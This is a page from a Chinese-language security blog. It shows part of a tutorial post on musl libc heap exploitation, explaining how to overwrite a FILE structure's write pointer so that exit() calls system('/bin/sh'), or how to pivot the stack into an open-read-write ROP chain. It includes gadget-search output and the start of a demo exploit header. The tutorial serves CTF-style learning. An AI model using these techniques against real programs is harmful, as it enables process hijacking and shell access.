<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/11/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/11/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">musl pwn 入门 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:41:27" itemprop="dateCreated datePublished" datetime="2023-02-28T22:41:27+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中，我们详细分析了如何通过musl的内存分配系统实现任意两个地址互相写的利用。本文据此讨论应该如何使用这种方式getshell。</p>
<p>首先看到musl中的<code>_IO_FILE</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">	<span class="type">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">	<span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">	<span class="type">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">int</span> pipe_pid;</span><br><span class="line">	<span class="type">long</span> lockcount;</span><br><span class="line">	<span class="type">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">	<span class="type">int</span> lbf;</span><br><span class="line">	<span class="type">void</span> *cookie;</span><br><span class="line">	<span class="type">off_t</span> off;</span><br><span class="line">	<span class="type">char</span> *getln_buf;</span><br><span class="line">	<span class="type">void</span> *mustbezero_2;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">	<span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中有4个函数指针<code>close</code>、<code>read</code>、<code>write</code>、<code>seek</code>。在解题时，标准输入输出的三个<code>FILE</code>结构体：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>是我们利用的重点。首先我们需要了解musl的exit函数调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>exit</code><br />
  <code>__stdio_exit</code><br />
    <code>close_file</code></p>
</blockquote>
<p>可以看到<code>close_file</code>中可能会调用三个<code>FILE</code>的<code>write</code>和<code>seek</code>函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将<code>FILE</code>结构体开头的几个字节修改为<code>/bin/sh</code>，再修改<code>write</code>指针的值为<code>system</code>，以及修改<code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>中其中之一就可以调用到<code>system(&quot;/bin/sh&quot;)</code>。而在有沙箱保护的情况下，还需要通过栈迁移才能进行orw。</p>
<p>由于调用<code>close_file</code>时，<code>rsp</code>周围的栈环境不受我们控制，因此我们不能使用带有<code>pop rsp</code>的gadget。以下是查找带有<code>mov rsp, xxx</code>的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop/my_how2heap/musl# ROPgadget --binary /lib/x86_64-linux-musl/libc.so | grep &quot;mov rsp&quot;</span><br><span class="line">0x0000000000076b32 : add byte ptr [rax], al ; sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000022c22 : add dword ptr [rax], eax ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x000000000007571b : add eax, dword ptr [rax] ; mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x000000000004d278 : je 0x4d183 ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x00000000000789f3 : jg 0x78a1d ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x0000000000022c0a : jne 0x22bf0 ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x000000000004d259 : lea ebx, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d258 : lea r11, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d247 : mov eax, 0xffffffff ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x00000000000789f2 : mov edi, dword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x00000000000789f1 : mov r15, qword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000007571d : mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x0000000000022c24 : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x0000000000022c0c : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000004d25c : mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d24c : mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b38 : mov rsp, rdx ; jmp rax</span><br><span class="line">0x000000000004d246 : sub byte ptr [rax - 1], bh ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b35 : sub edx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000076b34 : sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br></pre></td></tr></table></figure>
<p>其中注意到<code>mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</code>，由于<code>write</code>函数的第一个参数是<code>FILE</code>结构体自身，因此这里的<code>[rdi+0x30]</code>是我们可以通过提前修改控制的值，这样就能够控制<code>rsp</code>的值。同样，后面的<code>[rdi+0x38]</code>可以写入ROP链开头的一个gadget的地址，从而开始执行ROP链。这里注意到<code>[rdi+0x38]</code>当<code>rdi</code>等于<code>FILE</code>结构体地址时，0x38的偏移对应的正好就是<code>wbase</code>，这样可以在满足判断条件的同时写入gadget地址，一举两得。</p>
<p>总结：</p>
<ul>
<li>在无沙箱时，需要修改<code>FILE</code>结构体的3个地方——
<ul>
<li>起始位置写入<code>/bin/sh</code></li>
<li><code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>中其中之一使得二者不等</li>
<li><code>write</code>写入<code>system</code>函数地址。</li>
</ul>
</li>
<li>在有沙箱时，需要修改<code>FILE</code>结构体的3个地方——
<ul>
<li><code>f-&gt;wbase</code>写入第一个gadget地址使得<code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>不等的同时能够执行到gadget</li>
<li><code>write</code>写入刚才提到的栈迁移的gadget</li>
<li>偏移0x30处写入新的栈地址配合栈迁移gadget完成栈迁移</li>
<li>此外还需要在其他地方构造好ROP链用于orw</li>
</ul>
</li>
</ul>
<p>下面笔者编写的demo程序详细演示了两种利用方式的流程，为方便起见，demo中没有通过unlink进行地址写操作，而是直接写。如果使用unlink进行任意地址写，要注意偏移量，两个地址a和b中如果a能够写到b的位置，那么b会写到a+8的位置，对应于两个指针在结构体中的偏移，这一点在上一篇文章中最后打印结果时有体现，不要忽视。</p>
<p>如果执行不成功，请检查自己机器上的musl libc版本是否是1.2.2，若不是，则根据反汇编结果进行偏移量的调整即可。（选择orw模式时需确保当前文件夹中有flag文件）</p>
<p>头文件<code>musl_util.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span 